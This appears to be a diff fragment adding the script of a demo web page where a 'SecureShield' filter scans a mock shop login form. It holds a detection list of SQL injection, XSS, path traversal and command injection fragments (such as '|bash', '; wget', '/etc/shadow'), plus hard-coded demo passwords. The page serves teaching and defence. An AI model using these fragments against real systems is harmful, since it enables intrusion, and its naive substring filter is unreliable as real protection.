+      `<div class="line"><span class="ln">${ln}</span><span class="${cls}">${escHtml(text)}</span></div>`
+    ).join('');
+
+    explainEl.innerHTML = data.explanation;
+
+    const el = document.getElementById('result-blocked');
+    el.style.display = 'flex';
+    el.classList.remove('animate-in');
+    void el.offsetWidth;
+    el.classList.add('animate-in');
+  }
+
+  function quickTest(user, pass) {
+    document.getElementById('login-user').value = user;
+    document.getElementById('login-pass').value = pass;
+    tryLogin();
+  }
+
+  function tryLogin() {
+    const user = document.getElementById('login-user').value.trim();
+    const pass = document.getElementById('login-pass').value.trim();
+    const resultEl = document.getElementById('form-result');
+
+    // No username entered
+    if (!user) {
+      resultEl.style.display = 'block';
+      resultEl.className = 'form-result warning';
+      resultEl.innerHTML = '⚠️ <strong>Please enter a username first.</strong><br/>Use the quick test buttons above or type a name yourself.';
+      return;
+    }
+
+    // SecureShield pattern matching (mirrors the Python library)
+    const scanPatterns = [
+      { patterns: ["'--", "' --", "' or", "or '1'='1", "1=1", "' union", "union select", "; drop", "; select", "/*", "*/", "xp_", "exec(", "execute(", "waitfor", "sleep(", "benchmark("], type: "SQL Injection" },
+      { patterns: ["<script", "</script", "onerror=", "onload=", "javascript:", "alert(", "document.cookie", "window.location", "eval(", "prompt(", "confirm("], type: "XSS" },
+      { patterns: ["../", "..\\", "/etc/passwd", "/etc/shadow", "c:\\windows"], type: "Path Traversal" },
+      { patterns: [";ls", "; ls", "|bash", "| bash", ";wget", "; wget", "`whoami`", "$(id)"], type: "Command Injection" },
+    ];
+
+    const lowerUser = user.toLowerCase();
+    let detected = null;
+
+    for (const { patterns, type } of scanPatterns) {
+      for (const p of patterns) {
+        if (lowerUser.includes(p.toLowerCase())) {
+          detected = type;
+          break;
+        }
+      }
+      if (detected) break;
+    }
+
+    // Show result
+    resultEl.style.display = 'block';
+    resultEl.style.animation = 'none';
+    void resultEl.offsetWidth;
+    resultEl.style.animation = 'slideIn 0.3s ease';
+
+    if (detected) {
+      resultEl.className = 'form-result blocked';
+      resultEl.innerHTML = `
+        🚨 <strong>SecureShield Blocked This Request!</strong><br/>
+        Attack Type Detected: <strong>${detected}</strong>
+        <div class="result-steps">
+          <div>① Request came in: <code>/login?user=${escHtml(user)}&amp;pass=***</code></div>
+          <div>② SecureShield's <code>scan_url()</code> scanned the URL</div>
+          <div>③ Pattern matched → <strong>${detected}</strong> detected</div>
+          <div>④ Returned <strong>HTTP 403 Forbidden</strong> — login blocked ✅</div>
+          <div>⑤ Attack saved to <code>secureshield_attacks.csv</code> 📝</div>
+        </div>
+      `;
+    } else {
+      // Valid login — check credentials
+      const validUsers = { john: 'pass123', alice: 'hello', admin: 'admin123', user: '1234' };
+      const isValidLogin = validUsers[lowerUser] === pass;
+
+      if (isValidLogin) {
+        resultEl.className = 'form-result success';
+        resultEl.innerHTML = `
+          ✅ <strong>Login Successful! Welcome, ${escHtml(user)}!</strong> 🎉<br/>
+          You are now logged in to ShopZone.
+          <div class="result-steps">
+            <div>① Request scanned by SecureShield → <strong>No threats found</strong></div>
+            <div>② Credentials checked → <strong>Username &amp; password correct</strong></div>
+            <div>③ Session created → User logged in successfully ✅</div>
+          </div>
+        `;
+      } else {
+        resultEl.className = 'form-result success';
+        resultEl.innerHTML = `
+          🛡️ <strong>SecureShield: URL is Safe</strong> — Request passed through.<br/>
+          <span style="color:#555">But: incorrect username or password.</span>
+          <div class="result-steps">
+            <div>① SecureShield scanned <code>${escHtml(user)}</code> → <strong>No attack patterns found ✅</strong></div>
+            <div>② Request reached the login page normally</div>
+            <div>③ Login failed — wrong credentials (try: john / pass123)</div>
+          </div>
+        `;
+      }
+    }
+  }
+
+  function escHtml(str) {
+    return String(str)
+      .replace(/&/g,'&amp;')
+      .replace(/</g,'&lt;')
+      .replace(/>/g,'&gt;')
+      .replace(/"/g,'&quot;');
+  }
+
+  // Enter key on login form
+  document.getElementById('login-pass').addEventListener('keypress', e => {
+    if (e.key === 'Enter') tryLogin();
+  });
+  document.getElementById('login-user').addEventListener('keypress', e => {
+    if (e.key === 'Enter') tryLogin();
+  });
+</script>
+</body>
+</html>
